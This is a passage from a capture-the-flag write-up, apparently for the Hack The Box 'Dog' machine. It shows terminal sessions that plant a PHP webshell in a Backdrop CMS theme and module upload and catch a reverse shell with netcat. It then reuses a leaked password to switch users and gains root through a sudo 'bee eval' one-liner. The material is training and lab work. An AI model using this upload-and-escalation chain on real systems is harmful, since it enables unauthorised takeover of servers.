8.0K -rwxr-xr-x 1 kali kali 5.4K Aug  8 01:36  rev.php.jpg
4.0K drwxrwxr-x 5 kali kali 4.0K Aug  8 01:58  shaperrific
 52K -rw-rw-r-- 1 kali kali  51K Aug  8 01:58  shaperrific.zip
4.0K -rw-rw-r-- 1 kali kali   35 Aug  8 01:46  shell.php
   0 -rw-rw-r-- 1 kali kali    0 Aug  8 01:41  test.py
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/ctf/htb/dog/exploit]
└─$ ls shaperrific         
total 96K
4.0K drwxrwxr-x 5 kali kali 4.0K Aug  8 01:58 .
4.0K drwxrwxr-x 3 kali kali 4.0K Aug  8 01:58 ..
4.0K drwxrwxr-x 2 kali kali 4.0K Aug  8 01:58 color
4.0K drwxrwxr-x 2 kali kali 4.0K Aug  8 01:58 css
4.0K drwxrwxr-x 2 kali kali 4.0K Aug  8 01:58 js
 20K -rw-r--r-- 1 kali kali  18K Feb 22  2025 LICENSE.txt
4.0K -rw-r--r-- 1 kali kali 1.3K Feb 22  2025 README.md
 40K -rw-r--r-- 1 kali kali  38K Feb 22  2025 screenshot.png
4.0K -rw-r--r-- 1 kali kali  605 Feb 22  2025 shaperrific.info
4.0K -rw-r--r-- 1 kali kali  728 Feb 22  2025 template.php
4.0K -rw-r--r-- 1 kali kali 1.6K Feb 22  2025 theme-settings.php
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/ctf/htb/dog/exploit]
└─$ cp shell.php ./shaperrific
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/ctf/htb/dog/exploit]
└─$ zip -r shaperific.zip shaperrific 
  adding: shaperrific/ (stored 0%)
  adding: shaperrific/LICENSE.txt (deflated 62%)
  adding: shaperrific/js/ (stored 0%)
  adding: shaperrific/js/shaperrific-override.js (deflated 64%)
  adding: shaperrific/css/ (stored 0%)
  adding: shaperrific/css/color-admin.css (deflated 23%)
  adding: shaperrific/css/colors.css (deflated 47%)
  adding: shaperrific/css/shapes.css (deflated 72%)
  adding: shaperrific/css/styles.css (deflated 68%)
  adding: shaperrific/template.php (deflated 48%)
  adding: shaperrific/shell.php (stored 0%)
  adding: shaperrific/color/ (stored 0%)
  adding: shaperrific/color/color.inc (deflated 70%)
  adding: shaperrific/shaperrific.info (deflated 51%)
  adding: shaperrific/theme-settings.php (deflated 59%)
  adding: shaperrific/README.md (deflated 49%)
  adding: shaperrific/screenshot.png (deflated 5%)
```
Going back to our previously found CVE's I try one to upload malicious files via custom theme upload by injecting a php webshell, zipping it into and archive and uploading the theme to the CMS.

![Pasted image 20260807230538.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807230538.png)
Successfully installed malicious theme.

![Pasted image 20260807231525.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807231525.png)
no dice

![Pasted image 20260807233131.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807233131.png)
Successfully uploaded php rev shell sneaking it in side `Search Combined` module and then compressing it to an archive with `tar -cf --recursion search_combined.tar search_combined/` and uploading it to the "manual Install" endpoint, then navigating to the file's location on the server `http://dog.htb/modules/search_combined/shell.php`

```zsh
─$ nc -lnvp 8888                                                      
listening on [any] 8888 ...
connect to [10.10.14.192] from (UNKNOWN) [10.129.231.223] 60264
Linux dog 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 06:31:05 up  3:30,  0 users,  load average: 9.65, 10.21, 11.89
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```zsh
www-data@dog:/home$ su johncusack
Password: 
johncusack@dog:/home$ 
```
Attempting to abuse password reuse we find that user `johncusack` uses the same password as the leaked db pw.

## Privilege Escalation
```zsh
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee

```
Evaluating our sudo privs we can call `/usr/local/bin/bee` as any user with no password.

```zsh
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee eval "system('/bin/bash');"
root@dog:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)

```
As per `gtfobins` we navigate to the BackDrop CMS root folder `/var/www/html` and call the executable with `eval "system('bin/bash');"` as the arguments spawning an interactive session as `root`. pwned.

>[!info]
![Pasted image 20260810110336.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260810110336.png)
>![Pasted image 20260810110259.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260810110259.png)
[GTFOBins](https://gtfobins.org/gtfobins/bee/) States that `/usr/bin/bee` inherits commands directly from `php`. So we simply call a shell execution as the argument and get an interactive session.

## Takeaways
>[!tip]
>- Evaluate tf out of git repos. look for common terms like names of databases, accounts on the linux server, accounts on the app, look for generic markers like `root` and `mysql`, etc. as well.
>- If your upload doesn't work in one area, try in another area where you can upload, especially in something like a CMS
>- if you get a GTFO bins entry with 'inherit' the `'...'` section is meant to include the quotes but not the executable it inherits from.





